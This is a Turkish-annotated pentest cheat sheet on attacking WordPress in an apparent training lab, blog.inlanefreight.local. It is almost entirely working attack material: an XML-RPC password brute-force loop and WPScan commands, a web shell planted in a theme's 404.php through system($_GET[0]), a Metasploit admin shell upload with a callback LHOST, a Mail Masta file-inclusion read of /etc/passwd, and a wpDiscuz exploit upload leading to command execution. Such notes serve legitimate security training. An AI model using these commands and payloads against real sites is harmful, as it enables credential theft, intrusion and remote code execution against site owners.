# Attacking WordPress

## Brute Force

### [wp_getUsersBlogs](https://developer.wordpress.org/reference/classes/wp_xmlrpc_server/wp_getusersblogs/) Method

```sh
my@attack:~$ while IFS= read -r pass; do curl -s 'http://blog.inlanefreight.local/xmlrpc.php' -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>doug</value></param><param><value>$pass</value></param></params></methodCall>" | tee /dev/null | tr -d '\n' | grep -qv Incorrect && echo "$pass"; done < /usr/local/share/wordlists/rockyou.txt
```

### WPScan

!!! tip

    Geçerli saldırı yöntemleri:

    * wp-login
    * xmlrpc
    * xmlrpc-multicall

```sh
my@attack:~$ sudo wpscan --url "http://blog.inlanefreight.local" --password-attack xmlrpc -t 20 -U admin,doug -P /usr/local/share/wordlists/rockyou.txt
```

## RCE

### Theme Editor

1. Appearance
    * Theme Editor
    * Select theme to edit: Twenty Nineteen
    * Select
2. Theme Files
    * 404 Template (404.php)
    * Update File

```php title="404.php" linenums="1" hl_lines="11"
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WordPress
 * @subpackage Twenty_Nineteen
 * @since Twenty Nineteen 1.0
 */
system($_GET[0]);
get_header();
?>

    <div id="primary" class="content-area">
        <main id="main" class="site-main">

            <div class="error-404 not-found">
                <header class="page-header">
                    <h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentynineteen' ); ?></h1>
                </header><!-- .page-header -->

                <div class="page-content">
                    <p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentynineteen' ); ?></p>
                    <?php get_search_form(); ?>
                </div><!-- .page-content -->
            </div><!-- .error-404 -->

        </main><!-- #main -->
    </div><!-- #primary -->

<?php
get_footer();
```

```sh
my@attack:~$ curl -s 'http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id'
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Metasploit

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > set HTTPClientTimeout 90
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME doug
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD jessica1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 10.10.15.37
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.129.170.73
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
```

## Plugins

### [Mail Masta](https://wordpress.org/plugins/mail-masta/) (LFI)

```sh
my@attack:~$ curl -s 'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
```

```linuxconfig title="Output"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
webadmin:x:1001:1001::/home/webadmin:/bin/bash
mrb3n:x:1002:1002::/home/mrb3n:/bin/sh
```

### [wpDiscuz](https://wpdiscuz.com/)

!!! abstract

    [49967.py](https://www.exploit-db.com/exploits/49967) için gerekenler:

    1. URL.
    2. Geçerli bir gönderi yolu.

```sh
my@attack:~$ python3 49967.py -u "http://blog.inlanefreight.local" --path '/?p=1'
my@attack:~$ curl -s 'http://blog.inlanefreight.local/wp-content/uploads/2025/05/eruguzpajjshneq-1746492003.0374.php?cmd=id'
```

```output title="Output"
GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
